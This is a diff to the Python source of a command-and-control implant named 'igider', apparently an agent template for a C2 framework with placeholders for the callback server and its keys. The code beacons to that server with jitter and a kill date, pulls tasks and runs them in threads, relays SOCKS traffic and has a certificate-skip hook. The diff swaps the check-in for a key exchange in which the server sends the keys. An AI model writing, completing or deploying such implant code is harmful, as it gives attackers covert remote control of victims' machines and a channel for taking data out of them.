@@ -13,13 +13,19 @@ from datetime import datetime
 import threading
 import queue
 
+
+
+
+
 CHUNK_SIZE = 51200
 
 CRYPTO_MODULE_PLACEHOLDER
 
+
     def getOSVersion(self):
         if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
         else: return platform.system() + " " + platform.release()
+
 
     def getUsername(self):
         try: return getpass.getuser()
@@ -27,6 +33,7 @@ CRYPTO_MODULE_PLACEHOLDER
         for k in [ "USER", "LOGNAME", "USERNAME" ]: 
             if k in os.environ.keys(): return os.environ[k]
             
+   
     def formatMessage(self, data, urlsafe=False):
         output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
         if urlsafe: 
@@ -57,17 +64,21 @@ CRYPTO_MODULE_PLACEHOLDER
         except json.JSONDecodeError as e:
             return {}
 
+ 
     def postMessageAndRetrieveResponse(self, data):
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))
+
 
     def getMessageAndRetrieveResponse(self, data):
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
 
+ 
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
         message = { "action": "post_response", "responses": responses }
         response_data = self.postMessageAndRetrieveResponse(message)
 
+   
     def postResponses(self):
         try:
             responses = []
@@ -92,6 +103,7 @@ CRYPTO_MODULE_PLACEHOLDER
                     self.taskings.pop(self.taskings.index(task_index))
         except: pass
 
+    
     def processTask(self, task):
         try:
             task["started"] = True
@@ -115,6 +127,7 @@ CRYPTO_MODULE_PLACEHOLDER
             task["error"] = True
             task["completed"] = True
             task["result"] = error
+
 
     def processTaskings(self):
         threads = list()       
@@ -143,41 +156,31 @@ CRYPTO_MODULE_PLACEHOLDER
         if "socks" in tasking_data:
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
+    
     def checkIn(self):
-        hostname = socket.gethostname()
-        ip = ''
-        if hostname and len(hostname) > 0:
-            try:
-                ip = socket.gethostbyname(hostname)
-            except:
-                pass
-
-        data = {
-            "action": "checkin",
-            "ip": ip,
-            "os": self.getOSVersion(),
-            "user": self.getUsername(),
-            "host": hostname,
-            "domain": socket.getfqdn(),
-            "pid": os.getpid(),
-            "uuid": self.agent_config["PayloadUUID"],
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            "encryption_key": self.agent_config["enc_key"]["enc_key"],
-            "decryption_key": self.agent_config["enc_key"]["dec_key"]
+        # Initial check-in to translator container for key exchange
+        initial_payload = {
+            "action": "key_exchange",
+            "uuid": self.agent_config["PayloadUUID"]
         }
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
-        if not decoded_data:
+        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + json.dumps(initial_payload).encode())
+        
+        response = self.makeRequest(encoded_data, method='POST')
+        if not response:
             return False
+        
         try:
-            response_json = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"], "", 1))
-            if "status" in response_json and "id" in response_json:
-                self.agent_config["UUID"] = response_json["id"]
-                return True
-            else:
-                return False
-        except json.JSONDecodeError as e:
+            response_json = json.loads(response.decode().replace(self.agent_config["PayloadUUID"], "", 1))
+            # Store translator-generated keys in memory
+            self.agent_config["agent_to_server_key"] = response_json["EncryptionKey"]
+            self.agent_config["server_to_agent_key"] = response_json["DecryptionKey"]
+            self.agent_config["UUID"] = response_json["id"]
+            return True
+        except Exception:
             return False
+
+
+     
 
     def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
         # Build headers
@@ -203,6 +206,7 @@ CRYPTO_MODULE_PLACEHOLDER
             )
             req = urllib.request.Request(url, data, hdrs)
 
+    
         #CERTSKIP
 
         # ----- PROXY HANDLING -----
@@ -253,12 +257,15 @@ CRYPTO_MODULE_PLACEHOLDER
 
         return ""
 
+
+      
     def passedKilldate(self):
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
         kd = datetime(kd_list[0], kd_list[1], kd_list[2])
         if datetime.now() >= kd: return True
         else: return False
 
+    
     def agentSleep(self):
         j = 0
         if int(self.agent_config["Jitter"]) > 0:
@@ -267,7 +274,8 @@ CRYPTO_MODULE_PLACEHOLDER
                 j = random.randrange(0, int(v))    
         time.sleep(self.agent_config["Sleep"]+j)
 
-    #COMMANDS_PLACEHOLDER
+#COMMANDS_PLACEHOLDER
+
 
     def __init__(self):
         self.socks_open = {}
@@ -277,29 +285,28 @@ CRYPTO_MODULE_PLACEHOLDER
         self._meta_cache = {}
         self.moduleRepo = {}
         self.current_directory = os.getcwd()
-        
-        # CRITICAL FIX: Use translator-generated keys instead of AESPSK
         self.agent_config = {
-            "Server": "callback_host",
-            "Port": "callback_port",
-            "PostURI": "/post_uri",
-            "PayloadUUID": "UUID_HERE",
-            "UUID": "",
-            "Headers": headers,
-            "Sleep": callback_interval,
-            "Jitter": callback_jitter,
-            "KillDate": "killdate",
-            "agent_to_server_key": AGENT_TO_SERVER_KEY,
-            "server_to_agent_key": SERVER_TO_AGENT_KEY,
-            "ExchChk": "encrypted_exchange_check",
-            "GetURI": "/get_uri",
-            "GetParam": "query_path_name",
-            "ProxyHost": "proxy_host",
-            "ProxyUser": "proxy_user",
-            "ProxyPass": "proxy_pass",
-            "ProxyPort": "proxy_port",
-        }
-        
+        "Server": "callback_host",
+        "Port": "callback_port",
+        "PostURI": "/post_uri",
+        "PayloadUUID": "UUID_HERE",
+        "UUID": "",
+        "Headers": headers,
+        "Sleep": callback_interval,
+        "Jitter": callback_jitter,
+        "KillDate": "killdate",
+        # keys provided by translator container
+        "agent_to_server_key": None,
+        "server_to_agent_key": None,
+        "ExchChk": "encrypted_exchange_check",
+        "GetURI": "/get_uri",
+        "GetParam": "query_path_name",
+        "ProxyHost": "proxy_host",
+        "ProxyUser": "proxy_user",
+        "ProxyPass": "proxy_pass",
+        "ProxyPort": "proxy_port",
+    }
+
         max_checkin_retries = 10
         checkin_retry_delay = 30
 
@@ -318,30 +325,32 @@ CRYPTO_MODULE_PLACEHOLDER
             os._exit(1)
 
         try:
+
             while True:
-                if self.passedKilldate():
-                    self.exit(0)
-                try:
-                    self.getTaskings()
-                    self.processTaskings()
-                    self.postResponses()
-                except Exception as e:
-                    max_task_retries = 5
-                    task_retry_delay = 10
-                    for attempt in range(max_task_retries):
-                        try:
-                            self.getTaskings()
-                            self.processTaskings()
-                            self.postResponses()
-                            break
-                        except Exception as e2:
-                            if attempt < max_task_retries - 1:
-                                time.sleep(task_retry_delay)
-                    else:
-                        pass
-                self.agentSleep()   
+                    if self.passedKilldate():
+                        self.exit(0)
+                    try:
+                        self.getTaskings()
+                        self.processTaskings()
+                        self.postResponses()
+                    except Exception as e:
+                        # Retry tasking operations for a limited time
+                        max_task_retries = 5
+                        task_retry_delay = 10
+                        for attempt in range(max_task_retries):
+                            try:
+                                self.getTaskings()
+                                self.processTaskings()
+                                self.postResponses()
+                                break
+                            except Exception as e2:
+                                if attempt < max_task_retries - 1:
+                                    time.sleep(task_retry_delay)
+                        else:
+                            pass
+                    self.agentSleep()   
         except KeyboardInterrupt:
             self.exit(0)               
 
-    if __name__ == "__main__":
-        igider = igider()
+if __name__ == "__main__":
+    igider = igider()
